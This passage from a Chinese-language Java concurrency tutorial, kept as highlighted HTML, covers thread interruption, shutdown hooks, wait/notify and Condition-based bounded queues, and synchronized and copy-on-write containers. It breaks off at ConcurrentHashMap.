class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Interrupted</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="comment">//中断后结束循环</span></span><br><span class="line">            <span class="comment">//while (!Thread.currentThread().isInterrupted()) &#123;</span></span><br><span class="line">            <span class="comment">//    System.out.println(&quot;.&quot;);</span></span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 如果线程被中断后，我们并不想立即中断它那么我们需要重置中断状态为`未中断`。</span></span><br><span class="line">            <span class="comment">// 不然很多依赖中断状态的方法会出错，例如后面的sleep。</span></span><br><span class="line">            <span class="comment">// 重置中断状态，置线程状态为未中断。</span></span><br><span class="line">            <span class="comment">// Thread.interrupted();</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">4000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="comment">// 阻塞的线程被中断后，会抛出InterruptedException异常。并且中断状态会重置为未中断</span></span><br><span class="line">                <span class="comment">// 很多时候我们为了中断保证状态的正确，需要在捕获异常后将状态重置为已中断</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 恢复中断(状态) 置线程状态为中断</span></span><br><span class="line">                System.out.printf(<span class="string">&quot;catch1: %b\n&quot;</span>, Thread.currentThread().isInterrupted());</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">                System.out.printf(<span class="string">&quot;catch2: %b\n&quot;</span>, Thread.currentThread().isInterrupted());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        t.start();</span><br><span class="line">        <span class="comment">// Thread.sleep(4);</span></span><br><span class="line">        <span class="comment">// 中断线程</span></span><br><span class="line">        t.interrupt();</span><br><span class="line">    </span><br><span class="line">        System.out.printf(<span class="string">&quot;outer1: %b\n&quot;</span>, t.isInterrupted());</span><br><span class="line">        System.out.printf(<span class="string">&quot;outer2: %b\n&quot;</span>, t.isInterrupted());</span><br><span class="line">        System.out.printf(<span class="string">&quot;outer3: %b\n&quot;</span>, t.isInterrupted());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 两个线程，打印顺序每次可能不同</span></span><br><span class="line">        <span class="comment">// out &gt;&gt;</span></span><br><span class="line">        <span class="comment">//outer1: true   // 刚被中断，状态变为已中断</span></span><br><span class="line">        <span class="comment">//outer2: false  // 中断被catch后状态变为未中断</span></span><br><span class="line">        <span class="comment">//outer3: false  // 已中断</span></span><br><span class="line">        <span class="comment">//catch1: false  // 捕获异常后，状态为未中断</span></span><br><span class="line">        <span class="comment">//catch2: true   // 捕获异常后，重置中断状态后</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//out &gt;&gt;</span></span><br><span class="line">        <span class="comment">//outer1: true   // 刚被中断，状态变为已中断</span></span><br><span class="line">        <span class="comment">//catch1: false  // 捕获异常后，状态为未中断</span></span><br><span class="line">        <span class="comment">//outer2: false  // 中断被catch后状态变为未中断</span></span><br><span class="line">        <span class="comment">//catch2: true   // 捕获异常后，重置中断状态后</span></span><br><span class="line">        <span class="comment">//outer3: true   // catch里面重置状态中断状态后</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="如何中断任务？"><a href="#如何中断任务？" class="headerlink" title="如何中断任务？"></a>如何中断任务？</h4><p>可中断任务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">    <span class="comment">// 恢复中断状态</span></span><br><span class="line">    Thread.currentThread.interrupt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不可中断非阻塞任务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (!Thread.currentThread().isInterrupted()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不可中断阻塞任务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SocketThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SocketThread</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.socket = socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理中断</span></span><br><span class="line"><span class="comment">     * 关闭socket触发IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ignore) &#123;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.interrupt();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ReadableByteChannel</span> <span class="variable">channel</span> <span class="operator">=</span> Channels.newChannel(socket.getInputStream())) &#123;</span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">1024</span> * <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 这里会阻塞</span></span><br><span class="line">            <span class="keyword">while</span> (-<span class="number">1</span> != channel.read(buffer)) &#123;</span><br><span class="line">                buffer.flip();</span><br><span class="line">                <span class="comment">// write</span></span><br><span class="line">                buffer.clear();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException ignored) &#123;</span><br><span class="line">            <span class="comment">// socket.close() 触发 IOException 线程退出</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Shutdown-Hook"><a href="#Shutdown-Hook" class="headerlink" title="Shutdown Hook"></a>Shutdown Hook</h4><p>JVM在退出前会首先调用所有注册的关闭钩子。JVM不保证调用顺序（可以注册多个钩子），钩子必须是线程安全的。我们在钩子里面可以做清理工作。钩子应当尽快退出，它会延迟JVM结束时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// 清理工作</span></span><br><span class="line">    System.out.println(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h4 id="内置条件队列"><a href="#内置条件队列" class="headerlink" title="内置条件队列"></a>内置条件队列</h4><p>这里的条件是一种<strong>状态</strong>，当达到某种状态后我们可以继续后面的操作。例如，<code>队列空</code>、<code>队列满</code>都是一种状态，当队列为空时我们不能<code>take</code>操作，当队列满时我们不能<code>push</code>操作。当遇到上述状态时，我们可以可能需要等待，等待状态变更我们能进一步执行。等待的方式有多种，我们可以<code>自旋</code>也可以<code>休眠</code>。如果等待时间过久，<code>自旋</code>会浪费大量的CPU资源。如果<code>休眠</code>我们系统将不够灵敏。如果能有一种<code>通知机制</code>，当状态变更时通知我们的线程醒来再次检查状态。</p><p>Java里面wait&#x2F;notify就是这种机制。当我们在一个把锁上<code>wait</code>时，线程将<strong>释放锁</strong>并且CPU资源处于休眠状态。当在一把锁上调用<code>notify/notifyAll</code>时将唤醒在同一把锁上等待的线程。这既避免了<code>自旋</code>过久对于CPU的浪费，也解决了<code>休眠</code>时不能立即唤醒的问题。</p><p>我们可以看做每一把锁上面都有一个队列，队列里面存放的是这把锁上<code>wait</code>的线程，当在这把锁上调用<code>notify/notifyAll</code>时会唤醒队列里面的线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Queue</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayList&lt;T&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.size() &gt;= capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">return</span> take(Long.MAX_VALUE); <span class="comment">// 默认最大值，避免wait无意义的自动唤醒</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 锁一个私有的对象用来封闭条件队列</span></span><br><span class="line">        <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">            <span class="keyword">while</span> (isEmpty()) list.wait(timeout);</span><br><span class="line"></span><br><span class="line">            <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> list.remove(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 注意：此处必须是notifyAll，因为在list这把锁上除了等待`isEmpty`条件还有等待`isFull`条件等待的线程</span></span><br><span class="line">            <span class="comment">// 如果仅仅是notify将会只唤醒一个线程，我们本意是想唤醒`isFull`条件省等待的线程。如果唤醒的恰恰又是`isEmpty`条件上等待的线程，</span></span><br><span class="line">            <span class="comment">// 那么将会出现虽然`isFull`条件已经满足，但是在上述条件上等待的线程将不能被唤醒。</span></span><br><span class="line">            <span class="comment">// 要解决上述问题现在只有用notifyAll唤醒所有等待线程（惊群效应），让它们重新检查条件。如果符合则向下执行，如果不符合继续休眠。</span></span><br><span class="line">            <span class="comment">// 要完美解决上述问题需要后面的`Condition`条件队列支持。</span></span><br><span class="line">            list.notifyAll();</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        push(t, Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t, <span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (list) &#123;</span><br><span class="line">            <span class="keyword">while</span> (isFull()) list.wait(timeout);</span><br><span class="line"></span><br><span class="line">            list.add(t);</span><br><span class="line">            list.notifyAll();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自Java 1.5开始，Java并发包提供了新的选择，我们可以使用<code>Condition</code>来实现条件队列。它与传统的不同之处在于，在同一把锁上，我们可以创建多个条件队列，不同的条件可以放到不同的队列中。上例中有个弊端，当我们<code>notifyAll</code>时<code>isEmpty</code>和<code>isFull</code>条件等待的线程都会被唤醒。另外一个弊端是所有线程都会被唤醒，但是不是所有的线程获取锁再继续执行时就能满足条件，有可能会再次进入等待。例如对于生产者消费者模型，有多个消费者等待而此时只有一个生产者只生产了一个，那么所有消费者都被唤醒时，只有一个会成功抢到任务。其它会在唤醒后再次等待。还有一种情况是由于所有条件都在一个队列中，这个队列中可能既<code>队列空</code>又有<code>队列满</code>两种等待条件。我们一个<code>notifyAll</code>会唤醒两者，而实际情况是我们只想唤醒一种条件。例如，<code>push</code>时只想唤醒<code>队列空</code>条件的等待，而<code>take</code>时只想唤醒<code>队列满</code>条件的等待。这种无差别的唤醒同样会造成一种浪费。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Queue</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ArrayList&lt;T&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">    <span class="comment">// 为队列满和队列空分别创建条件队列</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">isFull</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Condition</span> <span class="variable">isEmpty</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(Integer.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Queue</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isFull</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.size() &gt;= capacity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> list.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">return</span> take(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T <span class="title function_">take</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (isEmpty()) isEmpty.await(timeout, TimeUnit.MILLISECONDS);</span><br><span class="line"></span><br><span class="line">            <span class="type">T</span> <span class="variable">t</span> <span class="operator">=</span> list.remove(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 不同等待条件分队列后就不需要全部唤醒（signalAll）了</span></span><br><span class="line">            <span class="comment">// 以前我们不能使用的原因两种条件等待都在一个队列里，由于我们不能控制唤醒谁就可能会唤醒一个我们不想唤醒的等待。</span></span><br><span class="line">            <span class="comment">// 例如我们在take后push操作上的等待应该可以执行了，由于无差别的唤醒可能我们会又唤醒一个take操作上的等待。</span></span><br><span class="line">            isFull.signal();</span><br><span class="line">            <span class="keyword">return</span> t;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        push(t, Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(T t, <span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (isFull()) isFull.await(timeout, TimeUnit.MILLISECONDS);</span><br><span class="line"></span><br><span class="line">            list.add(t);</span><br><span class="line">            isEmpty.signal();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="同步工具"><a href="#同步工具" class="headerlink" title="同步工具"></a>同步工具</h3><h4 id="同步容器"><a href="#同步容器" class="headerlink" title="同步容器 "></a>同步容器 </h4><ul><li><p>Vector</p><p>  最初版本的同步集合，所有方法均使用synchronized加锁同步。</p></li><li><p>HashTable </p><p>  最初版本的同步哈希表，所有方法均加锁同步。</p></li><li><p>Collections.synchronized(Collection|List|Map|Set|SortMap|SortSet)</p><p>  以上同步容器使用装饰器模式实现，将一个线程不安全的List&#x2F;Map封闭在容器内部，通过同一把锁（同步容器本身）保护对对象的所有操作（和Vector类似）。这种方式最重要的一点是防止被封闭的对象逸出。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SynchronizedList</span>&lt;E&gt;</span><br><span class="line">    <span class="keyword">extends</span> <span class="title class_">SynchronizedCollection</span>&lt;E&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">List</span>&lt;E&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">7754090372962971524L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> List&lt;E&gt; list;</span><br><span class="line"></span><br><span class="line">    SynchronizedList(List&lt;E&gt; list) &#123;</span><br><span class="line">        <span class="built_in">super</span>(list);</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">    SynchronizedList(List&lt;E&gt; list, Object mutex) &#123;</span><br><span class="line">        <span class="built_in">super</span>(list, mutex);</span><br><span class="line">        <span class="built_in">this</span>.list = list;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="comment">// 所有操作上都使用锁同步</span></span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.get(index);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.set(index, element);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, E element)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;list.add(index, element);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">remove</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (mutex) &#123;<span class="keyword">return</span> list.remove(index);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="并发容器"><a href="#并发容器" class="headerlink" title="并发容器"></a>并发容器</h4><ul><li><p>CopyOnWriteArrayList</p><p>  写入时复制的思想，每次更新时都会重新copy一份新的数据。由于每次修改都会复制底层数组，当容器规模较大时将会产生较大的开销。对于容器修改尽量调用批量操作的API，减少容器数据复制操作。这种容器主要用在读多写少的场景中。</p><p>  多线程可以同时对容器进行迭代，不会彼此干扰或与修改容器的线程相互干扰。写入时复制不会抛出<code>ConcurrentModificationException</code>异常，迭代的是创建迭代器时的元素，修改操作不会对迭代的数据有影响（修改后被迭代的数组和容器此时的数组已经不是同一个了，因此也不可能读到最新容器的变化）。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CopyOnWriteArrayList.add </span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="comment">// 排它锁保证了并发的安全性(可见性/原子性)，所有的更新操作使用同一把锁</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="built_in">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 容器底层数组</span></span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> elements.length;</span><br><span class="line">        <span class="comment">// !!!重点</span></span><br><span class="line">        <span class="comment">// 复制原数组到新数组中</span></span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 将元素添加到新数组中</span></span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        <span class="comment">// 重置容器底层数组</span></span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历操作</span></span><br><span class="line"><span class="comment">// 遍历的是创建迭代器时的数组，后面再修改已经不是修改的此数组了。</span></span><br><span class="line"><span class="keyword">public</span> ListIterator&lt;E&gt; <span class="title function_">listIterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">COWIterator</span>&lt;E&gt;(getArray(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ConcurrentHashMap</p><p>  